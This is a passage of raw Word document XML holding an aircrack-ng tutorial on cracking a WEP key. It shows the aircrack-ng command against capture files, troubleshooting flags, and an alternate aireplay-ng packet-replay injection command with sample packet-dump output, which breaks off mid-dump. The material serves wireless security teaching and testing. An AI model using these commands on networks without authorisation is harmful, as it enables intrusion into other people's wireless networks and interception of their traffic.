          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6863C62F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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7 - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B6EC9D"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Start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A02052" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1404C91A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008E353E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:14:6C:7E:40:80 capture*.ca</w:t>
      </w:r>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A39FB9" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E33354E"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2D90B48C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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capture</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>*.cap selects all dump files starting with “capture” and ending in “cap”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236B3614" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 selects the one access point we are interested in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63066139"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You can run this while generating packets. In a short time, the WEP key will be calculated and presented. Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets. As a reminder, the requirement is that you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the “--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CCBE3F"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Troubleshooting Tips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AB37FF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="006848FE" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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Sometimes you need to try various techniques to crack the WEP key. Try ”-n” to set various key lengths. Use ”-f” and try various fudge factors. Use ”-k” and try disabling various </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E902BEB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BF1C0FE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0485BC66" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Alternate Solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19994CBB"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You must also do a successful fake authentication first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292153D6"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Enter the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9A1187" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="779F719C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008E353E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD65A65" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C569DBF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00954648" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EE860C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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-2 means use interactive frame selection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26995626" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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p</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0841 sets the Frame Control Field such that the packet looks like it is being sent from a wireless client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638AB6D6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> FF:FF:FF:FF:FF:FF sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus getting the new IV.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B951113" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BCDDDF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689870ED" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00203DFA" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> defines the interface to use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3127CA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67D040B4"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4F2ECE"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Read 698 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C36083"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D5A6CF6"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Size: 86, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2112FE5F"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B556A7"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="77CA4431"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="25A71200"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:D0:CF:03:34:8C</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="156A49C4"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p>
    <w:p w14:paraId="299CADC9"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0x0000:  0842 0000 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0014 6c7e 4080  .B..........l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC3B9BA"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0x0010:  00d0 cf03 348c a0f4 2000 0000 e233 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>962a  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>4... ....3.*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B9203D"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0x0020:  90b5 fe67 41e0 9dd5 7271 b8ed ed23 8eda  ...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>gA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>...#</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="76168DD0"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0x0030:  ef55 d7b0 a56f bc16 355f 8986 a7ab d495  .U...o</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>5_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5A4B539B"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0x0040:  1daa a308 6a70 4465 9fa6 5467 d588 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
